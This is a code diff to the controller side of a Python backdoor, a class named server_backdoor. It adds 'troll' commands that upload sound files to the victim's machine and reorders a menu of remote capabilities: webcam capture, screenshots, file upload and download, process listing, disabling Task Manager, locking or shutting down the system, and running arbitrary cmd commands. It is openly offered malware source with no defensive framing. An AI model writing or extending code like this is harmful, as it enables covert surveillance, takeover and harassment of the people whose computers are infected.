@@ -6,10 +6,11 @@ import work_manager as wm
 
 class server_backdoor:
     work_manager = wm.manager()
-    list_of_argument_commands = ["download", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
+    required_arguments_commands = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = "TrollSFX\\"
-    hacked_sfx = TROLL_PATH + "CrazyLaugh.wav"
+    TROLL_PATH = "TrollSFX"
+    hacked_sfx = TROLL_PATH + "\CrazyLaugh.wav"
+    troll_sfx = TROLL_PATH + "\RunningAway.wav"
 
     screenshot_counter = 1
     webcam_counter = 1
@@ -68,7 +69,7 @@ class server_backdoor:
             return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)
 
     def read_file(self, path):
-        try:
+        try:            
             with open(path, "rb") as file:
                 return base64.b64encode(file.read()).decode()
         except Exception as e:
@@ -100,7 +101,7 @@ class server_backdoor:
 
     def is_valid(self, cmd_0, rest_of_command):
         #We are checking if the user wrote something that requires argument and if he really provided 
-        for i in self.list_of_argument_commands:
+        for i in self.required_arguments_commands:
             if cmd_0 == i:
                 if len(rest_of_command) == 0:
                     return False
@@ -129,17 +130,23 @@ class server_backdoor:
         print("Command\t\tDescription\n-------\t\t-----------")
         print("{}\t\t{}".format("webcam", "Get a snap of the webcam."))
         print("{}\t{}".format("screenshot", "Take a screenshot."))
+
+        print("\nComputer Information\n====================\n")
+        print("Command\t\tDescription\n-------\t\t-----------")
         print("{}\t\t{}".format("idle", "Get idle time."))
         print("{}\t\t{}".format("info", "Get Info about the user."))
-        
+        print("{}\t\t{}".format("user", "Get current user."))
+        print("{}\t\t{}".format("ps", "Display all the processes running."))
+
         print("\nOther Commands\n=============\n")
         print("Command\t\tDescription\n-------\t\t-----------")
-        print("{}\t\t{}".format("ps", "Display all the processes running."))
-        print("{}\t{}".format("sdmsg msg", "Send a message to the user."))
         print("{}\t{}".format("tsmanager", "Disable/Enable the Task Manager."))
+        print("{}\t{}".format("sdmsg msg", "Send a message to the user."))
         print("{}\t{}".format("cgstate 1", "Lock the system."))
         print("{}\t{}".format("cgstate 2", "Restart the system."))
         print("{}\t{}".format("cgstate 3", "Shut down the system."))
+        print("{}\t\t{}".format("troll 1", "Make the user realize he has been hacked."))
+        print("{}\t\t{}".format("troll 2", "Troll the user by random messages and sfx."))
         print("\nYou can execute any cmd command.\n")
 
     def run(self):
@@ -162,6 +169,19 @@ class server_backdoor:
 
                         file_content = self.read_file(file_path)
                         command.append(file_content)
+                    elif command_0 == "troll":
+                        if rest_of_command == "1":   #Hacked version
+                            print("[+] Uploading necessary files to the victim's system.")
+                            
+                            sfx_content = self.read_file(self.hacked_sfx)
+                            command.append(sfx_content)
+                        elif rest_of_command == "2":     #Troll version
+                            print("[+] Uploading necessary files to the victim's system.")
+
+                            sfx_content = self.read_file(self.troll_sfx)
+                            command.append(sfx_content)
+                        else:
+                            result = "[-] (Server) No such parameter for troll."
 
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
@@ -179,5 +199,5 @@ class server_backdoor:
  
             print(result)
 
-server = server_backdoor("192.168.1.112", 4444)
+server = server_backdoor("192.168.1.109", 4444)
 server.run()
